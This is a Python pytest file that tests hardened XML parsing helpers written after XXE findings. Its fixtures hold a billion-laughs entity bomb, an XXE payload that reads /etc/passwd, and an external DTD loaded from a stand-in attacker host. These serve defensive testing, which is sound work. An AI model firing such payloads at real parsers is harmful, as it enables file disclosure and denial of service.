"""Tests for hardened XML parsing helpers (WEB-5305 / Aikido XXE findings)."""

import xml.etree.ElementTree as ET

import pytest

from scripts.coding_discovery_tools.xml_helpers import (
    UnsafeXMLError,
    safe_xml_fromstring,
    safe_xml_parse,
)


BILLION_LAUGHS = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE lolz ["
    '<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
    "]>"
    "<lolz>&lol3;</lolz>"
)

XXE_FILE_READ = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<foo>&xxe;</foo>"
)

EXTERNAL_DTD = '<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd"><root/>'


class TestSafeXmlFromstring:
    def test_parses_benign_document(self):
        root = safe_xml_fromstring(
            "<application><component name='McpServers'><option value='x'/></component></application>"
        )
        assert root.find("component").get("name") == "McpServers"

    def test_parses_document_with_xml_declaration(self):
        root = safe_xml_fromstring("<?xml version='1.0' encoding='UTF-8'?><idea-plugin><id>a.b</id></idea-plugin>")
        assert root.find("id").text == "a.b"

    def test_rejects_billion_laughs(self):
        with pytest.raises(UnsafeXMLError):
            safe_xml_fromstring(BILLION_LAUGHS)

    def test_rejects_external_entity(self):
        with pytest.raises(UnsafeXMLError):
            safe_xml_fromstring(XXE_FILE_READ)

    def test_rejects_external_dtd(self):
        with pytest.raises(UnsafeXMLError):
            safe_xml_fromstring(EXTERNAL_DTD)

    def test_unsafe_error_is_caught_by_parse_error_handlers(self):
        # Callers only catch ET.ParseError; unsafe files must be skippable the same way.
        with pytest.raises(ET.ParseError):
            safe_xml_fromstring(XXE_FILE_READ)

    def test_malformed_raises_parse_error(self):
        with pytest.raises(ET.ParseError):
            safe_xml_fromstring("<a><unclosed>")


class TestSafeXmlParse:
    def test_parses_benign_file(self, tmp_path):
        xml_path = tmp_path / "mcpServers.xml"
        xml_path.write_text(
            "<?xml version='1.0'?><application><McpServerConfigurationProperties/></application>"
        )
        tree = safe_xml_parse(xml_path)
        assert tree.getroot().find("McpServerConfigurationProperties") is not None
        assert len(tree.findall(".//McpServerConfigurationProperties")) == 1

    def test_rejects_xxe_file(self, tmp_path):
        xml_path = tmp_path / "evil.xml"
        xml_path.write_text(XXE_FILE_READ)
        with pytest.raises(UnsafeXMLError):
            safe_xml_parse(xml_path)

    def test_malformed_file_raises_parse_error(self, tmp_path):
        xml_path = tmp_path / "broken.xml"
        xml_path.write_text("not xml at all")
        with pytest.raises(ET.ParseError):
            safe_xml_parse(xml_path)

    def test_missing_file_raises_os_error(self, tmp_path):
        with pytest.raises(OSError):
            safe_xml_parse(tmp_path / "does_not_exist.xml")
